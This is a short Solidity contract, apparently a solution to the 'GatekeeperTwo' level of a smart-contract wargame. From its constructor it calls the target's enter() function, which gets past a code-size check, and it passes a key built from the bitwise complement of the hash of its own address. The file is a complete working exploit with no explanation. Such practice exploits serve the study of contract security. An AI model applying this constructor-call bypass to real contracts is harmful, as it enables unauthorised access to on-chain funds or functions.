// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import {GatekeeperTwo} from "../levels/GatekeeperTwo.sol";

contract GatekeeperTwoAttack {
    constructor(GatekeeperTwo gatekeeperTwo){
        gatekeeperTwo.enter(~bytes8(keccak256(abi.encodePacked(address(this)))));
    }
}
